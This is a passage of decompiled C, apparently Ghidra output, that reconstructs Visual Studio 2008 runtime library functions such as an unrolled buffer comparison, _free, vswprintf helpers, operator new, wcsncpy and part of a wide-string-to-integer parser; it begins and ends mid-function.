          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_f:
        if (*(int *)((int)_Buf1 + (_Size - 0xf)) == *(int *)((int)_Buf2 + (_Size - 0xf))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_b:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xb));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xb))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_7:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 7));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 7))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 6));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 5));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_3:
        uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
        uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
        if ((uVar2 != uVar1) &&
           (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
          return iVar3;
        }
        goto LAB_0040af18;
      default:
        goto LAB_00409eab;
      }
      return 0;
    }
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 2);
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 3);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 3);
  }
  iVar3 = uVar1 - uVar2;
  if (iVar3 != 0) {
    iVar3 = (uint)(0 < iVar3) * 2 + -1;
  }
  return iVar3;
LAB_00409eab:
                    // WARNING: Load size is inaccurate
                    // WARNING: Load size is inaccurate
  if (*_Buf1 == *_Buf2) {
    iVar3 = 0;
  }
  else {
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf2;
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 2);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 3) - (uint)*(byte *)((int)_Buf2 + 3);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 4) == *(int *)((int)_Buf2 + 4)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 4);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 4);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 5);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 5);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 6);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 6);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 7) - (uint)*(byte *)((int)_Buf2 + 7);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 8) == *(int *)((int)_Buf2 + 8)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 8);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 8);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 9);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 9);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 10);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 10);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0xb) - (uint)*(byte *)((int)_Buf2 + 0xb);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0xc) == *(int *)((int)_Buf2 + 0xc)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0xc);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0xc);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0xd);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0xd);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0xe);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0xe);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0xf) - (uint)*(byte *)((int)_Buf2 + 0xf);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x10) == *(int *)((int)_Buf2 + 0x10)) {
    iVar3 = 0;
  }
  else {
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x10);
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x10);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x11);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x11);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x12);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x12);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x13) - (uint)*(byte *)((int)_Buf2 + 0x13);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x14) == *(int *)((int)_Buf2 + 0x14)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x14);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x14);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x15);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x15);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x16);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x16);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x17) - (uint)*(byte *)((int)_Buf2 + 0x17);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x18) == *(int *)((int)_Buf2 + 0x18)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x18);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x18);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x19);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x19);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1a);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1a);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1b) - (uint)*(byte *)((int)_Buf2 + 0x1b);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  if (*(int *)((int)_Buf1 + 0x1c) == *(int *)((int)_Buf2 + 0x1c)) {
    iVar3 = 0;
  }
  else {
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1c);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1c);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1d);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1d);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar2 = (uint)*(byte *)((int)_Buf1 + 0x1e);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1e);
    if ((uVar2 != uVar1) &&
       (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1f) - (uint)*(byte *)((int)_Buf2 + 0x1f);
    if (iVar3 != 0) {
      iVar3 = (uint)(0 < iVar3) * 2 + -1;
    }
  }
  if (iVar3 != 0) {
    return iVar3;
  }
  _Buf1 = (void *)((int)_Buf1 + 0x20);
  _Buf2 = (void *)((int)_Buf2 + 0x20);
  _Size = _Size - 0x20;
  goto LAB_0040a31d;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2008 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  
  if (_Memory != (void *)0x0) {
    if (DAT_0042576c == 3) {
      __lock(4);
      puVar1 = (uint *)___sbh_find_block((int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_0040b541();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_00423e54,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_0040b541(void)

{
  FUN_0040e2eb(4);
  return;
}



void __cdecl FUN_0040b579(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar2;
  }
  if (-1 < iVar2) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar3 = __flsbuf(0,&local_24);
      if (iVar3 == -1) goto LAB_0040b668;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar2;
    }
    iVar3 = __flsbuf(0,&local_24);
    if (iVar3 != -1) {
      return iVar2;
    }
  }
LAB_0040b668:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vswprintf_helper(__woutput_s_l,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,
                                 _ArgList);
      if (iVar2 < 0) {
        *_DstBuf = L'\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



int __cdecl FUN_0040b724(int param_1)

{
  if (param_1 < 0) {
    param_1 = -param_1;
  }
  return param_1;
}



// Library Function - Single Match
//  public: __thiscall std::bad_alloc::bad_alloc(void)
// 
// Library: Visual Studio 2008 Release

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this)

{
  exception::exception((exception *)this,(char **)&LAB_00422000,1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_0040b75a(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b579(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040b781(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined local_10 [12];
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_004239ac & 1) == 0) {
    _DAT_004239ac = _DAT_004239ac | 1;
    std::bad_alloc::bad_alloc((bad_alloc *)&DAT_004239a0);
    _atexit((_func_4879 *)&LAB_0041b7de);
  }
  FUN_0040b781(local_10,(exception *)&DAT_004239a0);
  __CxxThrowException_8(local_10,&DAT_004203bc);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  wchar_t wVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  puVar4 = (undefined4 *)_Dest;
  if (_Count != 0) {
    do {
      wVar1 = *_Source;
      *(wchar_t *)puVar4 = wVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      _Source = _Source + 1;
      if (wVar1 == L'\0') break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2008 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00422d90) && ((p_Var2->_ownlocale & DAT_00422cac) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_00422bb0) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_00422cac) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2008 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  localeinfo_struct local_34;
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_0040bb84;
  }
  local_c = 0;
  _C = *param_2;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = __iswctype_l(_C,8,&local_34);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_0040b973:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_0040b973;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_0040bb84:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_0040b9f1;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_0040b9f1;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_0040b9f1:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
